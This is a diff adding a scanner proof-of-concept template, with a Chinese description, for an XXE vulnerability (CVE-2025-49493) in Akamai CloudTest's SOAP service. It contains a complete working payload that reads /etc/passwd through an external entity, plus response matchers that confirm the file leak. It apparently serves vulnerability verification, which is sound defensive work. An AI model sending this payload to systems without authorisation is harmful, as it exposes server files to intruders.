@@ -1,0 +1,48 @@
+[info]
+author = "ave"
+description = "验证 Akamai CloudTest 60 2025.06.02 之前版本 SOAP 接口的 XML 外部实体注入漏洞。通过向 /concerto/services/SampleService 发送含文件读取实体引用的特制 SOAP XML 请求，若服务器未禁用外部实体解析，则会在响应中返回 /etc/passwd 文件内容，从而确认漏洞存在。"
+id = "POC-AVE-2025-0031"
+name = "Akamai CloudTest SOAP XXE Injection PoC"
+severity = "medium"
+tags = ["ave-2025-0031"]
+vuln_id = [
+    "CVE-2025-49493",
+    "AVE-2025-0031",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/concerto/services/SampleService"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE soapenv:Envelope [
+ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+ xmlns:rep="http://xml.soap.akamai.com/cloudtest">
+ <soapenv:Body>
+  <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>
+ </soapenv:Body>
+</soapenv:Envelope>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "text/xml; charset=utf-8"
+SOAPAction = ""
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "nobody:",
+    "daemon:",
+    "bin:",
+]
